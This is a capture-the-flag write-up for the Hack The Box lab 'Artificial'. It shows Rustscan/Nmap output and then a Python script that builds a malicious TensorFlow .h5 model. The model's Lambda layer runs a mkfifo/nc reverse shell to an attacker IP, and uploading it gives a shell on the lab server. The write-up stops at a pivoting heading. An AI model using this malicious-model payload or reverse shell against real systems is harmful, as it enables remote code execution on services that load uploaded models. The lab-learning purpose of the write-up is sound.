--------------

### Lab: Artificial
### CTF: Hackthebox

---------------

![image](https://github.com/user-attachments/assets/9201989e-5ade-41b5-a54c-fb55246cd2ed)

----------------

- Rustscan's output-:

```bash
❯ rustscan -a artificial.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.74:22
Open 10.10.11.74:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-27 21:07 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:07
Completed NSE at 21:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:07
Completed NSE at 21:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:07
Completed NSE at 21:07, 0.00s elapsed
Initiating Connect Scan at 21:07
Scanning artificial.htb (10.10.11.74) [2 ports]
Discovered open port 22/tcp on 10.10.11.74
Discovered open port 80/tcp on 10.10.11.74
Completed Connect Scan at 21:07, 0.25s elapsed (2 total ports)
Initiating Service scan at 21:07
Scanning 2 services on artificial.htb (10.10.11.74)
Completed Service scan at 21:08, 7.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.74.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 12.94s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.98s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.00s elapsed
Nmap scan report for artificial.htb (10.10.11.74)
Host is up, received user-set (0.23s latency).
Scanned at 2025-06-27 21:07:55 WAT for 22s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNABz8gRtjOqG4+jUCJb2NFlaw1auQlaXe1/+I+BhqrriREBnu476PNw6mFG9ifT57WWE/qvAZQFYRvPupReMJD4C3bE3fSLbXAoP03+7JrZkNmPRpVetRjUwP1acu7golA8MnPGzGa2UW38oK/TnkJDlZgRpQq/7DswCr38IPxvHNO/15iizgOETTTEU8pMtUm/ISNQfPcGLGc0x5hWxCPbu75OOOsPt2vA2qD4/sb9bDCOR57bAt4i+WEqp7Ri/act+f4k6vypm1sebNXeYaKapw+W83en2LnJOU0lsdhJiAPKaD/srZRZKOR0bsPcKOqLWQR/A6Yy3iRE8fcKXzfbhYbLUiXZzuUJoEMW33l8uHuAza57PdiMFnKqLQ6LBfwYs64Q3v8oAn5O7upCI/nDQ6raclTSigAKpPbliaL0HE/P7UhNacrGE7Gsk/FwADiXgEAseTn609wBnLzXyhLzLb4UVu9yFRWITkYQ6vq4ZqsiEnAsur/jt8WZY6MQ8=
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdlb8oU9PsHX8FEPY7DijTkQzsjeFKFf/xgsEav4qedwBUFzOetbfQNn3ZrQ9PMIHrguBG+cXlA2gtzK4NPohU=
|   256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH8QL1LMgQkZcpxuylBjhjosiCxcStKt8xOBU0TjCNmD
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

-  The webpage allows us to run ai models by uploading a `.h5` file.

![image](https://github.com/user-attachments/assets/346b0f14-84c0-4189-9cdd-dc9c38803723)

- It also contains a dockerfile.After reading it, I discovered that it uses `tensorflow-cpu` to runs the model.AN attacker can gain rce on a server if a malicious model is uploaded and run by the server.

```Dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

- I got an exploit for tensorflow on this [repository](https://github.com/Splinter0/tensorflow-rce.git).Althogh, I modified the reverse shell payload to `mkfifo`.Building the dockerfile makes it easier to create the exploit becaause that specific version is required to build the `.h5` model.


```python3
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.158 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

-  Creating the exploit-:

![image](https://github.com/user-attachments/assets/d9e92c65-057d-4d70-b86b-f79ffe7611ac)

- Uploaded the `.h5` model,viewed predictions and gained `shell` as user `app`-:

![image](https://github.com/user-attachments/assets/8c72d9a2-ed44-4432-ba23-93fd05dca76c)

---------------

### Pivoting to user `gael`

-----------------

